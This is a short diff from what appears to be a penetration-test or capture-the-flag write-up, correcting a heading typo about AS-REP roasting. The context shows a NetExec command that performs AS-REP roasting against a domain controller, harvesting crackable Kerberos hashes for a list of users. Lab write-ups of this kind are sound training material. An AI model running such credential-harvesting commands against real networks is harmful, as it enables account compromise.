@@ -138,7 +138,7 @@ I am able to use null auth to dump users but not able to list shares
 
 The guest account is disabled
 
-# AS-REP roasting leads to user compromised
+# AS-REP roasting leads to user compromise
 
 ```python
 nxc ldap dc01.shadow.gate -u users.txt -p '' --asreproast asrep.hash             
